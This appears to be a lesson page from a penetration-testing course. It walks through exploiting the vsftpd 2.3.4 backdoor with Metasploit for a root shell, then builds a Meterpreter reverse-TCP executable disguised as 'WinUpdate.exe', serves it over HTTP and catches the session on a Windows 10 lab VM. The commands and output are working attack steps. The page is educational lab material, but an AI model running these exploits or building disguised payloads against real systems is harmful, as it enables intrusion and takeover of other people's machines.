# Day 17 — Hacking with Metasploit (Exploitation)
[← Back to overview](README.md)

## Bringing Days 13–16 Together
Day 17 is the payoff day — every prior step (Nessus scan → searchsploit → shell/payload theory → msfconsole basics)
gets chained into two complete, real exploitation walkthroughs against the lab's Metasploitable target
(`192.168.29.150`) and a Windows 10 VM.

### Quick refresher — the Client-Server Model
Every attack in this walkthrough is still just the client-server model: a **Client** sends a **Request**, the
**Server** returns a **Response**, over the **Network**. Whether it's a browser talking to a web server or a
Metasploit exploit talking to a vulnerable FTP daemon, the same request/response pattern underlies it.

## Part 1 — Exploiting the vsftpd 2.3.4 Backdoor (Linux target)

**1. Confirm the target and service (recap of Day 11/13/14):**
```bash
sudo nmap -sS -sV 192.168.29.150
```
```
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
...
5900/tcp open  vnc         VNC (protocol 3.3)
```

**2. Confirm an exploit exists:**
```bash
searchsploit vsftpd 2.3.4
```
```
vsftpd 2.3.4 - Backdoor Command Execution              | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb
```

**3. Launch Metasploit and load the module:**
```bash
msfconsole
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
```
```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   -------  ---------------  --------  -----------
   RHOSTS                    yes       The target host(s)
   RPORT    21                yes       The target port (TCP)

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.29.150
RHOSTS ⇒ 192.168.29.150
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.29.150:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.29.150:21 - USER: 331 Please specify the password.
[+] 192.168.29.150:21 - Backdoor service has been spawned, handling ...
[+] 192.168.29.150:21 - UID: uid=0(root) gid=0(root)
```
**Result: an interactive root shell, no privilege escalation needed** — exactly matching the "running as root"
warning Nessus flagged back on Day 13.

## Part 2 — Generating & Catching a Windows Payload

**1. Build a Windows Meterpreter reverse-TCP payload with msfvenom:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.160 LPORT=6677 -f exe -o WinUpdate.exe
```
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: WinUpdate.exe
```
Named `WinUpdate.exe` as a simple social-engineering pretext — the file is delivered/executed on the Windows 10
target machine as part of the lab exercise.

**2. Serve the payload for the target to fetch:**
```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**3. Stand up a matching listener in Metasploit:**
```bash
msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload ⇒ windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.29.160
LHOST ⇒ 192.168.29.160
msf6 exploit(multi/handler) > set LPORT 6677
LPORT ⇒ 6677
msf6 exploit(multi/handler) > exploit
```

**4. Catch the session once `WinUpdate.exe` runs on the Windows target:**
```
[*] Started reverse TCP handler on 192.168.29.160:6677
[*] Sending stage (176198 bytes) to 192.168.29.29
[*] Meterpreter session 1 opened (192.168.29.160:6677 → 192.168.29.29:63183) at 2024-12-16 07:12:36 -0500

meterpreter > sysinfo
Computer        : DESKTOP-5RFFFDT
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >
```
Full, interactive Meterpreter access to the Windows 10 machine — confirming compromise with `sysinfo` before moving
on to any post-exploitation actions.

## Why It Matters
This day is the practical proof that recon → vulnerability scanning → exploit research → payload theory isn't
academic: it produces two working shells, one root-level Unix shell via a known FTP backdoor and one Meterpreter
session on a fully patched-looking Windows 10 desktop via a custom-built payload. It also highlights the two most
common real-world initial-access paths side by side: **exploiting an unpatched public-facing service** (vsftpd) vs.
**getting a user to run something** (WinUpdate.exe) — reconnaissance and social engineering leading to the exact
same outcome, an attacker-controlled session.

## 🧠 Quick Revision Questions
1. Why did the vsftpd exploit not require any payload to be set, unlike the Windows attack?
2. What two things have to match exactly between the `msfvenom` payload and the `multi/handler` listener for the
   callback to succeed?
3. Why is `sysinfo` typically the first command run once a Meterpreter session opens?

## 🔑 New Glossary Terms
- **Meterpreter** — Metasploit's advanced, in-memory post-exploitation payload/agent.
- **LHOST / LPORT** — the attacker's listening IP address and port that a reverse payload calls back to.
- **Session** — an active, interactive connection between the attacker's console and a compromised host.
- **sysinfo** — a Meterpreter command that reports the compromised host's OS, architecture and domain info.

---
[← Day 16](day16.md) | [Back to overview](README.md) | [Next: Day 18 →](day18.md)
